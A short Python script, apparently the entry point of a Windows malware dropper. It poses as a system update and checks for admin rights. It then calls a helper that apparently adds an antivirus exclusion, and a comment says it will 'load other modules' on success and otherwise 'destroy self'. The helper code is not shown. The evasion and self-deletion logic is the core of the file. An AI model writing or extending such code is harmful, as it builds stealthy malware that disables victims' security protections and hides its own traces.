import ctypes.wintypes
import subprocess
import os
import ctypes
from functions.shared import is_admin, display_message, add_exclusion, self_destruct

if __name__ == "__main__":
    if not is_admin():
        # print("This requires administrative privileges. Please run as administrator to update your system.")
        display_message("This script requires administrative privileges.\nAttempting to re-launch as administrator...", "Admin Privileges Required", "info")
    else:
        # if add exclusion true then load other modules, else destroy self
        if add_exclusion():
            pass
        else:
            self_destruct()